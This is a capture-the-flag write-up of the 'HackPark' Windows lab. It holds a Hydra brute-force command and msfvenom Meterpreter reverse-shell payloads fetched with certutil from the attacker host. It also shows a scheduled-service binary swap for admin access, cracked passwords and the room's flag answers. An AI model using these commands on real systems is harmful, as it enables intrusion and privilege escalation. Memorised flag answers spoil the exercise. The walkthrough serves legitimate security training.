# HackPark - Medium

1. [Deploy the vulnerable Windows machine](#deploy-the-vulnerable-windows-machine)
2. [Using Hydra to brute-force a login](#using-hydra-to-brute-force-a-login)
3. [Compromise the machine](#compromise-the-machine)
4. [Windows Privilege Escalation](#windows-privilege-escalation)
5. [Privilege Escalation Without Metasploit](#privilege-escalation-without-metasploit)

## Deploy the vulnerable Windows machine

```markdown
We have to access the web server initially (port 80).

The clown image can be reverse-searched to find its name.
```

```markdown
1. What's the name of the clown displayed on the homepage? - Pennywise
```

## Using Hydra to brute-force a login

```markdown
On inspecting the page, we can see that the page is using POST requests.

The blog page contains a login form link as well, we can use Hydra to brute-force our way through.

For the password-cracking to work, we have to mention the username, password wordlist, form type, IP and the request body.

We can try the username 'admin' for brute-forcing.
```

```shell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.216.57 http-post-form "/Account/login.aspx:__VIEWSTATE=AmInWQjOL%2BAHMc9qQ0CW0CFnlUXaqoRXEj%2FOvBixV%2Fld9p%2BKj%2B7mB%2FZ7FcrOxWmCkIjSfD9utiaSxAvSBmKz1VkaDvYW9b5sxJWoX3ZOskfQg0u3CsSjndshwiuLcEq7l%2BRc7FwwBs%2BvLvrnXfcLFt%2B0vNv1zwwLa3QoTUjG3V9hk0Sg&__EVENTVALIDATION=zMZzvwm4lfkTglvBFfLhbEjJu8yEheigLkmHJ7E8owtV2FVK0TTZdne0RExmMdPY5RORs4UuLmymoBfQmY8UwKaRwaqnpZkAM%2BPLgxPNj3wtiiTaC4jbJSUoKPCRWBtpMIz4vtdxr9zbhDPn5zB7IJSOpA%2FMzo6LYD9oiiaMKWUj8VNM&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
```

```markdown
1. What request type is the Windows website login form using? - POST

2. Guess a username, choose a password and gain credentials to a user account - 1qaz2wsx
```

## Compromise the machine

```markdown
We can log into the page using creds admin:1qaz2wsx and check the BlogEngine version in the About section.

From exploit-db, we find CVE-2019-6714 for BlogEngine 3.3.6.0

By following the instructions given for the exploit, we can get access.
```

```markdown
1. Identify the version of the BlogEngine? - 3.3.6.0

2. What is the CVE? - CVE-2019-6714

3. Who is the webserver running as? - iis apppool\blog
```

## Windows Privilege Escalation

```shell
#we gain shell access using the exploit
#but it needs to be upgraded to Meterpreter

#in attacker machine
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.17.48.136 LPORT=4545 -f exe -o park.exe
#generate payload

python3 -m http.server

#we need to transfer this payload to the windows machine
#in target machine
cd C:\Windows\Temp

certutil.exe -urlcache -f http://10.17.48.136:8000/park.exe park.exe

dir
#shows payload park.exe

#back in attacker machine
msfconsole

use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp

set LHOST 10.17.48.136

set LPORT 4545

exploit

#in target machine, we have to execute the payload
park.exe

#back in our attacker machine, we get meterpreter shell
help
#shows possible commands

sysinfo

ps
#shows running processes
#we can use winPEAS to enumerate the system for vulnerabilities
upload /home/sv/Tools/winPEASx64.exe C:\\Windows\\Temp

shell

.\winPEASx64.exe
#shows possible vulnerabilities
#this includes the administrator's password: 4q6XvFES7Fdxs

exit
#go back to meterpreter shell

ps
#view running processes

#we can check the Program Files (x86) directory

shell

cd C:

cd "Program Files (x86)"

dir

cd SystemScheduler
#we can check the log files given

type LogFile.txt

type LogfileAdvanced.txt
#the log files do not show relevant details
#however the directory contains running processes such as WScheduler.exe
#this gives us a hint about the abnormal service
#the log file can be found in the Events directory
cd Events

dir

type 20198415519.INI_LOG.txt
#shows Message.exe being run as Administrator
#we can create a payload with the same name and upload it

#in attacker machine
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.17.48.136 LPORT=1234 -f exe -o Message.exe

python3 -m http.server

msfconsole

use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp

set LHOST 10.17.48.136

set LPORT 1234

#before running this exploit, we have to take a backup of Message.exe and then upload our payload

#in target machine
rename Message.exe Message.exe.bak

Certutil.exe -urlcache -f http://10.17.48.136:8000/Message.exe Message.exe

#now we can run our exploit on attacker machine
exploit

#we have Admin access now
getuid

shell
#user flag can be found on jeff's Desktop
#root flag can be found on Admin's Desktop
```

```markdown
1. What is the OS version of this windows machine? - Windows 2012 R2 (6.3 Build 9600).

2. What is the name of the abnormal service running? - Windows Scheduler

3. What is the name of the binary you're supposed to exploit? - Message.exe

4. What is the user flag? - 759bd8af507517bcfaede78a21a73e39

5. What is the root flag? - 7e13d97f05f7ceb9881a3eb3d78d3e72
```

## Privilege Escalation Without Metasploit

```markdown
The original install time can be found using winPEASx64.exe

It is shown in Administrator's 'Password Last Set' time.
```

```markdown
1. Using winPeas, what was the Original Install time? - 8/3/2019, 10:43:23 AM
```
